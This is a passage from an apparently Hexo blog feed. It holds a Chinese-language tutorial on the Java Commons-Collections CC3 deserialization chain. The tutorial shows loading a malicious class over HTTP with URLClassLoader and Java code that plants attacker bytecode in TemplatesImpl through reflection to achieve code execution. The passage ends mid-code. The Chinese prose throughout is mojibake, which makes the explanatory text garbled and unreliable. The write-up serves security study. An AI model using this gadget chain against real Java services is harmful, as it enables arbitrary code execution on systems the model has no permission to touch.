æ˜¯<code>javax.management.InstanceAlreadyExistsException</code> å¯¼è‡´å¯åŠ¨å¤±è´¥ã€‚å› ä¸º JMXï¼ˆJava Management Extensionsï¼‰ä¸­çš„ MBeanï¼ˆManaged Beanï¼‰å·²ç»å­˜åœ¨äº MBean æœåŠ¡å™¨ä¸­ï¼Œå¯¼è‡´æ— æ³•é‡å¤æ³¨å†Œã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240529173118068.png" alt="image-20240529173118068"></p><p>é€‰æ‹©ç¦ç”¨JMXç«¯ç‚¹å³å¯</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240529173328755.png" alt="image-20240529173328755"></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVAä»£ç å®¡è®¡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaååºåˆ—åŒ–CommonsCollectionsç¯‡-CC3</title>
    <link href="/2024/05/27/JAVA%E5%AE%89%E5%85%A8/CC3/"/>
    <url>/2024/05/27/JAVA%E5%AE%89%E5%85%A8/CC3/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>CC1å’ŒCC2éƒ½æ˜¯é€šè¿‡ååºåˆ—åŒ–è‡ªåŠ¨æ‰§è¡Œäº†object()æ–¹æ³•æœ€ç»ˆå¯¼è‡´äº†<code>InvokerTransformer.transform(Method.invoke())</code>çš„å‘½ä»¤æ‰§è¡Œï¼Œé‚£æœ‰æ²¡æœ‰ä¸€ç§å¯èƒ½ï¼Œä¸é€šè¿‡<code>InvokerTransformer.transform(Method.invoke())</code>æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼ŸCC3ç»™å‡ºäº†ç­”æ¡ˆï¼ŒCC3æ˜¯é€šè¿‡JAVAçš„åŠ¨æ€ç±»åŠ è½½æœºåˆ¶æ¥è‡ªåŠ¨æ‰§è¡Œæ¶æ„ç±»ä»£ç ã€‚</p><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><ul><li><p>JDK8u65</p></li><li><p>Commons-Collections 3.2.1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependencies&gt;<br>  <br>     &lt;dependency&gt;<br>         &lt;groupId&gt;commons-collections&lt;/groupId&gt;<br>         &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;<br>         &lt;version&gt;<span class="hljs-number">3.2</span><span class="hljs-number">.1</span>&lt;/version&gt;<br>     &lt;/dependency&gt;<br>  <br> &lt;/dependencies&gt;<br></code></pre></td></tr></table></figure></li></ul><h2 id="JAVAåŠ¨æ€ç±»åŠ è½½"><a href="#JAVAåŠ¨æ€ç±»åŠ è½½" class="headerlink" title="JAVAåŠ¨æ€ç±»åŠ è½½"></a>JAVAåŠ¨æ€ç±»åŠ è½½</h2><h3 id="åˆ©ç”¨URLClassLoaderåŠ è½½classæ–‡ä»¶"><a href="#åˆ©ç”¨URLClassLoaderåŠ è½½classæ–‡ä»¶" class="headerlink" title="åˆ©ç”¨URLClassLoaderåŠ è½½classæ–‡ä»¶"></a>åˆ©ç”¨URLClassLoaderåŠ è½½classæ–‡ä»¶</h3><p>Javaçš„<code>ClassLoader</code>æ¥ç”¨æ¥åŠ è½½å­—èŠ‚ç æ–‡ä»¶æœ€åŸºç¡€çš„æ–¹æ³•ï¼Œ<code>ClassLoader </code>æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå®ƒå°±æ˜¯ä¸€ä¸ªâ€œåŠ è½½å™¨â€ï¼Œå‘Šè¯‰Javaè™šæ‹Ÿæœºå¦‚ä½•åŠ è½½è¿™ä¸ªç±»ã€‚Javaé»˜è®¤çš„<code> ClassLoader</code> å°±æ˜¯æ ¹æ®ç±»åæ¥åŠ è½½ç±»ï¼Œè¿™ä¸ªç±»åæ˜¯ç±»å®Œæ•´è·¯å¾„ï¼Œå¦‚<code>java.lang.Runtime</code>ã€‚</p><p><code>URLClassLoader</code> ç»§æ‰¿äº†<code>ClassLoader</code>ä¹Ÿå°±æ˜¯è¯´<code>URLClassLoader</code>æŠŠ<code>ClassLoader</code>æ‰©å±•äº†ä¸€ä¸‹ï¼Œæ‰€ä»¥å¯ä»¥ç†è§£æˆ<code>URLClassLoader</code>åŠŸèƒ½è¦å¤šç‚¹ã€‚<code>URLClassLoader</code> å®é™…ä¸Šæ˜¯æˆ‘ä»¬å¹³æ—¶é»˜è®¤ä½¿ç”¨çš„ <code>AppClassLoader </code>çš„çˆ¶ç±»ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬è§£é‡Š <code>URLClassLoader </code>çš„å·¥ä½œè¿‡ç¨‹å®é™…ä¸Šå°±æ˜¯åœ¨è§£é‡Šé»˜è®¤çš„Javaç±»åŠ è½½å™¨çš„å·¥ä½œæµç¨‹ã€‚ </p><p>æ­£å¸¸æƒ…å†µä¸‹ï¼ŒJavaä¼šæ ¹æ®é…ç½®é¡¹ <code>sun.boot.class.path </code>å’Œ<code>java.class.path</code>ä¸­åˆ—ä¸¾åˆ°çš„åŸºç¡€è·¯å¾„ï¼ˆè¿™äº›è·¯å¾„æ˜¯ç»è¿‡å¤„ç†åçš„ java.net.URL ç±»ï¼‰æ¥å¯»æ‰¾.classæ–‡ä»¶æ¥åŠ è½½ï¼Œè€Œè¿™ä¸ªåŸºç¡€è·¯å¾„æœ‰åˆ†ä¸ºä¸‰ç§æƒ…å†µï¼š</p><ul><li><p>URLæœªä»¥æ–œæ  &#x2F; ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨ <code>JarLoader </code>æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯» æ‰¾.classæ–‡ä»¶ã€‚</p></li><li><p>URLä»¥æ–œæ  &#x2F; ç»“å°¾ï¼Œä¸”åè®®åæ˜¯ file ï¼Œåˆ™ä½¿ç”¨ <code>FileLoader </code>æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯» æ‰¾.classæ–‡ä»¶ ã€‚</p></li><li><p>URLä»¥æ–œæ  &#x2F; ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯ file ï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„ Loader æ¥å¯»æ‰¾ç±» æˆ‘ä»¬æ­£å¸¸å¼€å‘çš„æ—¶å€™é€šå¸¸é‡åˆ°çš„æ˜¯å‰ä¸¤è€…ï¼Œé‚£ä»€ä¹ˆæ—¶å€™æ‰ä¼šå‡ºç°ä½¿ç”¨ Loader å¯»æ‰¾ç±»çš„æƒ…å†µå‘¢ï¼Ÿå½“ç„¶æ˜¯ é file åè®®çš„æƒ…å†µä¸‹ï¼Œæœ€å¸¸è§çš„å°±æ˜¯ http åè®®ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨HTTPåè®®æ¥æµ‹è¯•ä¸€ä¸‹ï¼Œçœ‹Javaæ˜¯å¦èƒ½ä»è¿œç¨‹HTTPæœåŠ¡å™¨ä¸ŠåŠ è½½.classæ–‡ä»¶ã€‚</p></li></ul><h4 id="httpè¿œç¨‹åŠ è½½ï¼š"><a href="#httpè¿œç¨‹åŠ è½½ï¼š" class="headerlink" title="httpè¿œç¨‹åŠ è½½ï¼š"></a>httpè¿œç¨‹åŠ è½½ï¼š</h4><p>æˆ‘ä»¬ç¼–è¯‘ä¸€ä¸ªæ¶æ„ç±»ï¼Œæ”¾åœ¨ <a href="http://localhost/Test.class">http://localhost/Test.class</a></p><p>(æŠŠç¼–è¯‘å¥½çš„classæ–‡ä»¶å•ç‹¬æ‹¿å‡ºæ¥ï¼Œæ”¾åœ¨å¦å¤–ä¸€ä¸ªç›®å½•ï¼Œè¿›å…¥è¿™ä¸ªç›®å½•ï¼Œåˆ©ç”¨pythonå¯åŠ¨httpæœåŠ¡å°±è¡Œ<code>python -m http.server 80</code>)</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240527234616607.png" alt="image-20240527234616607"></p><p> æˆåŠŸè¯·æ±‚åˆ°æˆ‘ä»¬çš„ &#x2F;Test.class æ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œäº†æ–‡ä»¶é‡Œçš„å­—èŠ‚ç ã€‚ æ‰€ä»¥ï¼Œä½œä¸ºæ”»å‡»è€…ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ç›®æ ‡<code> ClassLoader</code>çš„åŸºç¡€è·¯å¾„ä¸ºä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œåˆ™å¯ä»¥åˆ© ç”¨è¿œç¨‹åŠ è½½çš„æ–¹å¼æ‰§è¡Œä»»æ„ä»£ç äº†ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240528082827361.png" alt="image-20240528082827361"></p><h4 id="fileæœ¬åœ°åŠ è½½"><a href="#fileæœ¬åœ°åŠ è½½" class="headerlink" title="fileæœ¬åœ°åŠ è½½:"></a>fileæœ¬åœ°åŠ è½½:</h4><p>æˆ‘ä»¬ç¼–è¯‘Testç±»ï¼Œæ”¾åœ¨â€C:\Users\Desktopâ€ ï¼Œä¹Ÿæ˜¯æ‰§è¡Œäº†æ–‡ä»¶é‡Œçš„å­—èŠ‚ç ã€‚ä»–æ˜¯åˆ™ä½¿ç”¨ <code>FileLoader</code> æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯» æ‰¾.classæ–‡ä»¶ ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240527234632078.png" alt="image-20240527234632078"></p><h3 id="åˆ©ç”¨ClassLoader-defineClassç›´æ¥åŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨ClassLoader-defineClassç›´æ¥åŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨ClassLoader#defineClassç›´æ¥åŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨ClassLoader#defineClassç›´æ¥åŠ è½½å­—èŠ‚ç </h3><p>å‰é¢æˆ‘ä»¬è®¤è¯†åˆ°äº†å¦‚ä½•åˆ©ç”¨<code>URLClassLoader</code>åŠ è½½è¿œç¨‹classæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯å­—èŠ‚ç ã€‚å…¶å®ï¼Œä¸ç®¡æ˜¯åŠ  è½½è¿œç¨‹classæ–‡ä»¶ï¼Œè¿˜æ˜¯æœ¬åœ°çš„classæˆ–jaræ–‡ä»¶ï¼ŒJavaéƒ½ç»å†çš„æ˜¯ä¸‹é¢è¿™ä¸‰ä¸ªæ–¹æ³•è°ƒç”¨ï¼š</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240528090248851.png" alt="image-20240528090248851"></p><ul><li>å…¶ä¸­ï¼š <code>loadClass </code>çš„ä½œç”¨æ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆè¿™é‡Œå®é™…ä¸Šæ˜¯åŒäº²å§”æ´¾æœº åˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ<code> findClass</code> ã€‚</li><li><code>findClass</code> çš„ä½œç”¨æ˜¯æ ¹æ®åŸºç¡€URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå¯èƒ½ä¼šåœ¨ æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€jaråŒ…æˆ–è¿œç¨‹httpæœåŠ¡å™¨ä¸Šè¯»å–å­—èŠ‚ç ï¼Œç„¶åäº¤ç»™ <code>defineClass</code>ã€‚</li><li><code>defineClass</code> çš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±» ã€‚</li></ul><p>æ‰€ä»¥å¯è§ï¼ŒçœŸæ­£æ ¸å¿ƒçš„éƒ¨åˆ†å…¶å®æ˜¯ <code>defineClass</code> ï¼Œä»–å†³å®šäº†å¦‚ä½•å°†ä¸€æ®µå­—èŠ‚æµè½¬å˜æˆä¸€ä¸ªJavaç±»ï¼ŒJava é»˜è®¤çš„ <code>ClassLoader#defineClass </code>æ˜¯ä¸€ä¸ªnativeæ–¹æ³•ï¼Œé€»è¾‘åœ¨JVMçš„Cè¯­è¨€ä»£ç ä¸­ã€‚ </p><p>æ³¨æ„ä¸€ç‚¹ï¼Œåœ¨ defineClass è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œç±»å¯¹è±¡æ˜¯ä¸ä¼šè¢«åˆå§‹åŒ–çš„ï¼Œåªæœ‰è¿™ä¸ªå¯¹è±¡æ˜¾å¼åœ°è°ƒç”¨å…¶æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–ä»£ç æ‰èƒ½è¢«æ‰§è¡Œã€‚è€Œä¸”ï¼Œå³ä½¿æˆ‘ä»¬å°†åˆå§‹åŒ–ä»£ç æ”¾åœ¨ç±»çš„staticå—ä¸­ï¼Œåœ¨<code> defineClass</code> æ—¶ä¹Ÿæ— æ³•è¢«ç›´æ¥è°ƒç”¨åˆ°ã€‚æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬è¦ä½¿ç”¨ <code>defineClass</code> åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œéœ€è¦æƒ³åŠæ³•è°ƒç”¨æ„é€ å‡½æ•°ã€‚</p><p>ï¼ˆä¸è¿›è¡Œåˆå§‹åŒ–ï¼‰</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240528084507413.png" alt="image-20240528084507413"></p><p>ï¼ˆåˆå§‹åŒ–ï¼‰</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240528084342573.png" alt="image-20240528084342573"></p><p>è¿™é‡Œï¼Œå› ä¸ºç³»ç»Ÿçš„<code> ClassLoader#defineClass</code> æ˜¯ä¸€ä¸ªä¿æŠ¤å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥åœ¨å¤–éƒ¨è®¿é—®ï¼Œä¸å¾—ä¸ä½¿ç”¨åå°„çš„å½¢å¼æ¥è°ƒç”¨ã€‚ åœ¨å®é™…åœºæ™¯ä¸­ï¼Œå› ä¸º<code>defineClass</code>æ–¹æ³•ä½œç”¨åŸŸæ˜¯ä¸å¼€æ”¾çš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¾ˆå°‘èƒ½ç›´æ¥åˆ©ç”¨åˆ°å®ƒï¼Œä½†å®ƒå´æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„ä¸€ä¸ªæ”»å‡»é“¾ TemplatesImpl çš„åŸºçŸ³ã€‚</p><h2 id="TemplatesImpl-è§£æ"><a href="#TemplatesImpl-è§£æ" class="headerlink" title="TemplatesImpl è§£æ"></a>TemplatesImpl è§£æ</h2><p>æˆ‘ä»¬çŸ¥é“defineClass()å¯ä»¥ç›´æ¥åŠ è½½å­—èŠ‚ç ï¼Œé‚£æˆ‘ä»¬å¯ä»¥åƒä¹‹å‰æ‰¾CCé“¾ä¸€æ ·ï¼Œåè¿‡å»æ‰¾è°è°ƒç”¨äº†defineClass()ï¼Œæ‰¾åˆ°äº†<code>com.sun.org.apache.xalan.internal.xsltc.trax</code>ä¸‹çš„<code>TemplatesImpl.TransletCLassLoader.defineClass()</code></p><p>JAVAä¸­æ²¡æœ‰è®¿é—®æƒé™ä¿®é¥°è¯çš„æ˜¯defaultç±»å‹ï¼Œå®ƒå¯ä»¥è®¿é—®åœ¨åŒä¸€ä¸ªåŒ…ä¸­çš„å…¶ä»–ç±»çš„æˆå‘˜ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240526215828567.png" alt="image-20240526215828567"></p><p>çœ‹å“ªè°ƒç”¨äº†<code> defineClass</code>ï¼Œçœ‹åˆ°è¿˜æ˜¯åŒç±»<code>TemplatesImpl.defineTransletClasses()</code>è°ƒç”¨äº†<code>defineClass </code>ä½†è¿˜æ˜¯privateï¼Œåˆæ‰¾å“ªé‡Œè°ƒç”¨äº†<code>defineTransletClasses ()</code>ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240526220246988.png" alt="image-20240526220246988"></p><p>æ‰¾åˆ°äº†<code> TemplatesImpl.getTransletInstance()</code>ï¼Œæ­£å¥½<code>newInstance()</code>,ä½†æ˜¯è¿˜æ˜¯ privateã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240526220419165.png" alt="image-20240526220419165"></p><p>æœ€ç»ˆæ‰¾åˆ°äº† <code>TemplatesImpl.newTransformer()</code>æ˜¯public</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240526220516376.png" alt="image-20240526220516376"></p><p>æ­£å¥½è¿™ä¸ªç±»ç»§æ‰¿äº†Serializableæ¥å£ï¼Œå°±å¾ˆæ–¹ä¾¿æˆ‘ä»¬</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240527105116341.png" alt="image-20240527105116341"></p><p>è°ƒç”¨é“¾</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240527154250480.png" alt="image-20240527154250480"></p><h3 id="å®ç°TemplatesImplçš„é€»è¾‘"><a href="#å®ç°TemplatesImplçš„é€»è¾‘" class="headerlink" title="å®ç°TemplatesImplçš„é€»è¾‘"></a>å®ç°TemplatesImplçš„é€»è¾‘</h3><p>æŒ‰ç…§ä¸Šé¢çš„æ­¥éª¤ä»£ç å…¶å®å°±éœ€è¦è¿™ä¸¤è¡Œï¼Œä½†æ˜¯è‚¯å®šè¿™æ ·æ˜¯ä¸èƒ½è¿è¡Œçš„ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240527105424926.png" alt="image-20240527105424926"></p><p>è®©æˆ‘ä»¬è·Ÿè¿›<code>TemplatesImpl()</code>ï¼Œå…¶å®åé¢çš„ä¸èµ‹å€¼ï¼Œä¹Ÿèƒ½èµ°åˆ°æˆ‘ä»¬æƒ³è¦çš„<code>getTransletInstance()</code>ï¼Œè·Ÿè¿›<code>getTransletInstance()</code></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240527105723051.png" alt="image-20240527105723051"></p><p><code>_name</code>éœ€è¦èµ‹å€¼</p><p><code>_class</code>ä¸èƒ½èµ‹å€¼ï¼Œå› ä¸ºæˆ‘ä»¬å°±æƒ³è°ƒç”¨<code>defineTransletClasses()</code></p><p>è·Ÿè¿›<code> defineTransletClasses()</code></p><p>éšåä»£ç ä¼šèµ°åˆ°<code>_class[transletIndex].newInstance()</code></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240527105855030.png" alt="image-20240527105855030"></p><p>è·Ÿè¿›<code> defineTransletClasses()</code></p><p><code>_bytecodes</code>éœ€è¦èµ‹å€¼</p><p><code>_tfactory</code>éœ€è¦è°ƒæ–¹æ³•ï¼Œéœ€è¦èµ‹å€¼,å»çœ‹ä¸€ä¸‹ <code>_tfactory</code>æ˜¯ä»€ä¹ˆ</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240527110211207.png" alt="image-20240527110211207"></p><p>å¯ä»¥çœ‹åˆ°<code>_tfactory</code>æ˜¯transientï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒå¹¶ä¸èƒ½åºåˆ—åŒ–ã€‚è¿™å°±å¾ˆæœ‰æ„æ€äº†ï¼Œè¦ç”¨ä½†æ˜¯ä¸èƒ½åºåˆ—åŒ–ï¼Œé‚£æœ‰å¯èƒ½åœ¨<code>readObect()</code>é‡Œé¢ã€‚</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240527110600370.png" alt="image-20240527110600370"></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240527110644855.png" alt="image-20240527110644855"></p><p>éšå<code>defineClass(_bytecodes[i])</code>åŠ è½½å­—èŠ‚ç </p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240527213049967.png" alt="image-20240527213049967"></p><h3 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h3><p>å…¶ä»–çš„éƒ½å¾ˆç®€å•ï¼Œå”¯ä¸€çš„éš¾ç‚¹æ˜¯å¯èƒ½ä¸çŸ¥é“è¿™é‡Œä¸ºå•¥è¿™æ ·å†™</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Tests.class&quot;</span>));<br><span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>bytecodesField.set(templates, codes);<br></code></pre></td></tr></table></figure><p>å› ä¸º_bytecodesæ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240527213730267.png" alt="image-20240527213730267"></p><p>ä½†æ˜¯<code>defineClass()</code>æ¥æ”¶ä¸€ä¸ªä¸€ç»´æ•°ç»„</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240527213808776.png" alt="image-20240527213808776"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        templates.newTransformer();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç©ºæŒ‡é’ˆæŠ¥é”™"><a href="#ç©ºæŒ‡é’ˆæŠ¥é”™" class="headerlink" title="ç©ºæŒ‡é’ˆæŠ¥é”™"></a>ç©ºæŒ‡é’ˆæŠ¥é”™</h3><p>é‡åˆ°ä¸€ä¸ªç©ºæŒ‡é’ˆé”™è¯¯</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240527112539992.png" alt="image-20240527112539992"></p><p>è¿™é‡Œæ‰“ä¸ªæ–­ç‚¹è°ƒè¯•ä¸€ä¸‹</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240527153320593.png" alt="image-20240527153320593"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œç©ºæŒ‡é’ˆæŠ¥é”™ï¼Œçœ‹ä¸€ä¸‹é€»è¾‘ï¼Œå°±æ˜¯è¦æ±‚<code>_bytecodes</code>çˆ¶ç±»ä¸º<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p><p>ç„¶åæŠŠiçš„å€¼èµ‹ç»™<code>_transletIndex</code>  (_transletIndexé»˜è®¤ä¸º-1) ï¼Œå¦åˆ™å°±ç©ºæŒ‡é’ˆæŠ¥é”™ã€‚</p><p>å½“<code>_transletIndex</code>&lt;0ä¹Ÿä¼šæŠ¥é”™ã€‚æ‰€ä»¥åªèƒ½å°†çˆ¶ç±»æ”¹ä¸º<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240527170701421.png" alt="image-20240527170701421"></p><p>å¯¼å…¥<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code> å‘ç°éœ€è¦å®ç°ä¸¤ä¸ªæ¥å£</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240527113056413.png" alt="image-20240527113056413"></p><p><code>TemplatesImpl</code>çš„æ‰€æœ‰é€»è¾‘å°±èµ°å®Œäº†</p><p><img src="https://image.sp4rks.xyz/2024/06/image-20240527173454095.png" alt="image-20240527173454095"></p><h2 id="CC1çš„TemplatesImpl-çš„å®ç°æ–¹å¼"><a href="#CC1çš„TemplatesImpl-çš„å®ç°æ–¹å¼" class="headerlink" title="CC1çš„TemplatesImpl çš„å®ç°æ–¹å¼"></a>CC1çš„TemplatesImpl çš„å®ç°æ–¹å¼</h2><p>æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹ï¼Œæœ¬è´¨ä¸Šæ¥è®²å°±æ˜¯æ¢äº†ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„åœ°æ–¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code 